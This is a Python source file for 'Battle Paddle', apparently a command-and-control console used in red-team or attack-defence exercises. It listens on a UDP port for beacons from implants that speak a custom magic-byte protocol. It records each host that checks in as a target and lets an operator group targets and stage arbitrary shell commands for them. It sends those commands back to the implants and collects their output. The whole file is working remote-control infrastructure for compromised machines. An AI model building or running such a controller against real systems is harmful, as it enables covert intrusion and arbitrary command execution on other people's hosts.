from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import Completer, Completion, NestedCompleter, WordCompleter
from prompt_toolkit.validation import Validator
from pyfiglet import Figlet
import socket
import random
from multiprocessing import Process, Pipe, Manager
from time import sleep


MAGIC_BYTES = b'\x42\x50\x3c\x33'
REQUEST_BYTE = b'\x01'
RAW_COMMAND_BYTE = b'\x02'
RESPONSE_BYTE = b'\x03'
KEEP_ALIVE_BYTE = b'\x04'
RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'


def socket_listen(targets, pipe):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ('172.16.245.1', 1337)
    sock.bind(server_address)
    target_cmds = {}
    target_responses = {}
    while True:
        data, addr = sock.recvfrom(4096)
        cur_target = addr[0]
        target_address = bytes(map(int, cur_target.split('.')))
        cmd_num = data[6:10]
        if pipe.poll() and len(target_cmds) == 0:
            target_cmds = pipe.recv()
        if cur_target not in targets:
            targets.append(cur_target)
            target_responses[cur_target] = list()
            pipe.send(target_responses)
        if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
            try:
                for cmd in target_cmds[cur_target]:
                    cmd = bytes(cmd, 'utf-8')
                    length = len(cmd).to_bytes(2, byteorder='big')
                    packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                    sock.sendto(packet, addr)
                target_cmds.pop(cur_target)
            except KeyError:
                packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                sock.sendto(packet, addr)
        elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
            response_len = int.from_bytes(data[14:16], byteorder='big')
            response = data[16:16+response_len].decode('utf-8')
            target_responses[cur_target].append(response)
            pipe.send(target_responses)
        sleep(.01)


f = Figlet(font=random.choice(Figlet().getFonts()))
f.width = 999
print(f.renderText('Battle Paddle'))

manager = Manager()

discovered_targets = manager.list()

executeCommands = {}
responses = {}
parentEnd, childEnd = Pipe()

p = Process(target=socket_listen, args=(discovered_targets, childEnd))
p.start()

groups = {}
stagedCommands = {}

targetCompleter = WordCompleter(discovered_targets)
groupCompleter = WordCompleter(groups)
stagedCommandsCompleter = WordCompleter(stagedCommands)

mainCommandsDict = {
    "show": {
        "targets": None,
        "info": None,
        "groups": None,
        "responses": {
            "target": targetCompleter
        },
        "staged": {
            "commands": None
        }
    },
    "set": {
        "name": None,
        "target": {
            "group": groupCompleter,
            "list": targetCompleter
        },
        "command": None
    },
    "del": {
        "group": groupCompleter
    },
    "create": {
        "group": None
    },
    "edit": {
        "group": groupCompleter
    },
    "clear": None,
    "stage": None,
    "execute": stagedCommandsCompleter,
    "save": None,
    "load": None,
    "exit": None,
}

groupCommandsDict = {
    "add": targetCompleter
}

completer = NestedCompleter.from_nested_dict(
    mainCommandsDict
)

completerGroupEdit = NestedCompleter.from_nested_dict(
    groupCommandsDict
)


def is_valid_main(text):
    d = mainCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True


def is_valid_group(text):
    d = groupCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True


validatorMain = Validator.from_callable(
    is_valid_main,
    error_message="Invalid command",
    move_cursor_to_end=True,
)

validatorGroup = Validator.from_callable(
    is_valid_group,
    error_message="Invalid command",
    move_cursor_to_end=True,
)

stage_target = set()
stage_commands = list()
stage_command_name = ''

toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'

try:
    while 1:
        if parentEnd.poll():
            responses = parentEnd.recv()
        user_input = prompt(u'BP> ',
                            history=FileHistory('history.txt'),
                            auto_suggest=AutoSuggestFromHistory(),
                            completer=completer,
                            bottom_toolbar=toolbarStr,
                            validator=validatorMain,
                            validate_while_typing=False
                            )

        # if user_input == '':
        #     toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        if 'show targets' in user_input:
            print(f'Known targets {discovered_targets}')
        elif 'show info' in user_input:
            print(f'Still working on')
        elif 'show groups' in user_input:
            print(f'Groups: {groups}')
        elif 'show staged commands' in user_input:
            print('Staged commands:')
            for k, v in stagedCommands.items():
                print(f'Stage name:{k} -> {v}')
        elif 'show responses target' in user_input:
            s = user_input.strip().split('show responses target ')
            if len(s) > 1:
                _, target = s
                for t in target.split(' '):
                    print(f'Target {t} responses: {responses[t]}')
        elif 'set target group' in user_input:
            stage_target.clear()
            s = user_input.strip().split('set target group ')
            if len(s) > 1:
                _, target_group = s
                for g in target_group.split(' '):
                    stage_target.add(g)
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'set name' in user_input:
            cmd_name = ''
            s = user_input.strip().split('set name ')
            if len(s) > 1:
                _, cmd_name = s
                stage_command_name = cmd_name.split(' ')[0]
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'set target list' in user_input:
            stage_target.clear()
            s = user_input.strip().split('set target list ')
            if len(s) > 1:
                _, target = s
                for exec_targets in target.split(' '):
                    stage_target.add(exec_targets)
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'set command' in user_input:
            s = user_input.strip().split('set command ')
            if len(s) > 1:
                _, c = s
                stage_commands.append(c)
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'del group' in user_input:
            s = user_input.strip().split('del group ')
            if len(s) > 1:
                _, group = s
                groups.pop(group)
        elif 'create group' in user_input:
            s = user_input.strip().split('create group ')
            if len(s) > 1:
                _, group = s
                groups[group.split(' ')[0]] = set()
        elif 'edit group' in user_input:
            s = user_input.strip().split('edit group ')
            if len(s) > 1:
                _, group = s
                group = group.split(' ')[0]
                group_input = prompt(f'[Edit group {group}]\nBP> ',
                                     history=FileHistory('history.txt'),
                                     auto_suggest=AutoSuggestFromHistory(),
                                     completer=completerGroupEdit,
                                     bottom_toolbar=toolbarStr,
                                     validator=validatorGroup,
                                     validate_while_typing=False
                                     )
                if 'add' in group_input:
                    u = group_input.strip().split('add ')
                    if len(u) > 1:
                        _, target = u
                        for exec_targets in target.split(' '):
                            groups[group].add(exec_targets)
        elif 'clear' in user_input:
            stage_target.clear()
            stage_commands.clear()
            stage_command_name = ''
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'execute' in user_input:
            executeCommands = {}
            s = user_input.strip().split('execute ')
            if len(s) > 1:
                _, stages = s
                for stage in stages.split(' '):
                    exec_targets = stagedCommands[stage]['target']
                    for exec_target in exec_targets:
                        if exec_target in groups:
                            for target in groups[exec_target]:
                                executeCommands[target] = stagedCommands[stage]['commands']
                        else:
                            executeCommands[exec_target] = stagedCommands[stage]['commands']
            parentEnd.send(executeCommands)
        elif 'stage' in user_input:
            if stage_command_name == '' or len(stage_commands) == 0 or len(stage_target) == 0:
                print('Command is not ready to be staged')
            stagedCommands[stage_command_name] = {
                "commands": stage_commands.copy(),
                "target": stage_target.copy()
            }
            stage_command_name = ''
            stage_commands.clear()
            stage_target.clear()
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
        elif 'save' in user_input:
            print('To be implemented')
        elif 'load' in user_input:
            print('To be implemented')
        elif 'exit' in user_input:
            print(f.renderText('GG'))
            p.kill()
            exit()
        else:
            toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
except (KeyboardInterrupt, EOFError):
    print(f.renderText('GG'))
    p.kill()
